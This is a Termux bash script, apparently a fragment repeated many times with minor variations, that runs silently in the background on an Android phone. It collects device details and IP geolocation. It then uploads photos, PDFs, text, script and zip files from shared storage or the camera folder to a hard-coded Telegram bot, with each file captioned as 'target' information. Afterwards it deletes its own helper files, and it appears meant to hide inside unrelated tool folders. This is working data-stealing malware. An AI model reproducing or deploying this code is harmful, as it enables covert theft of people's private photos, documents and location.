                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
Yōkoso sensei GALIRUS !
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
Yōkoso sensei GALIRUS !
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
Yōkoso sensei GALIRUS !
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear

clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
Yōkoso sensei GALIRUS !
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear

clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
Yōkoso sensei GALIRUS !
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear

clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
